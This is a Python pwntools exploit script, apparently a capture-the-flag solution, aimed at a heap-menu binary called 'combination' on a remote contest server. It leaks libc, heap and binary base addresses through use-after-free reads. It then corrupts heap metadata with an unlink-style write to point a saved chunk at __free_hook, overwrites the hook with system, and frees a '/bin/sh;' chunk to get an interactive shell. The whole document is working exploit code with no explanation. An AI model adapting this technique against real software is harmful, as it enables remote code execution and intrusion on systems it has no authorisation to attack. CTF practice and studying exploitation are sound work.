from pwn import *
import sys, time

context.binary = "./combination"
binary = ELF("./combination")

p = remote("challenges.whitehatcontest.kr", "47850")

def malloc(size, data):
   p.recvuntil("> ")
   p.sendline("1")
   p.recvuntil(" : ")
   p.sendline(str(size))
   p.recvuntil(" : ")
   p.sendline(data)

def free(idx):
   p.recvuntil("> ")
   p.sendline("2")
   p.recvuntil(" : ")
   p.sendline(str(idx))

def show(idx):
   p.recvuntil("> ")
   p.sendline("3")
   p.recvuntil("? ")
   p.sendline(str(idx))

def edit(idx, data, shell=False):
   p.recvuntil("> ")
   p.sendline("4")
   p.recvuntil(" : ")
   p.sendline(str(idx))
   p.recvuntil("data : ")
   if shell:
       p.send(data)
   else:
       p.sendline(data)

def exit():
   p.recvuntil("> ")
   p.sendline("5")

def hidden():
   p.recvuntil("> ")
   p.sendline("46")


malloc(0x108, "A" * 8)      # 1
malloc(0x108, "/bin/sh;")      # 2
malloc(0x108, "C" * 8)      # 3
malloc(0x108, "D" * 8)      # 4

free(3)
show(3)     # libc leak

p.recvuntil("Data : ")
libc = u64(p.recv(6).ljust(8, "\x00")) - 0x3c4b20 - 88
free_hook = libc + 0x3c67a8
system = libc + 0x45390
log.info("libc : " + hex(libc))
log.info("__free_hook : " + hex(free_hook))

free(1)
show(1)
p.recvuntil("Data : ")
heap = u64(p.recv(6).ljust(8, "\x00")) - 0x220
log.info("heap : " + hex(heap))

hidden()

p.sendline(str(0x18))
p.send("a" * 0x18)
show(5)
p.recvuntil("a" * 0x18)
binary_base = u64(p.recv(5).ljust(8, "\x00")) - 0xb11
chunk_save = binary_base + 0x202060
log.info("binary_base : " + hex(binary_base))
log.info("chunk_save : " + hex(chunk_save))


malloc(0x108, "a" * 8)
malloc(0x108, "a" * 8)

malloc(0x1f8, "b" * 8)
malloc(0x1f8, "c" * 8)      # 9
malloc(0x1f8, "/bin/sh;")      # 10
malloc(0x1f8, "e" * 8)

edit(9, p64(0) + p64(0x1b1 + 0x40) + p64(chunk_save + 0xc0 - 0x18) + p64(chunk_save + 0xc0 - 0x10) + "c" * (0x190 + 0x40) + p64(0x1b0 + 0x40))
free(10)

edit(9, p64(free_hook) + p64(100) + p64(0))
edit(8, p64(system))
free(2)

p.interactive()
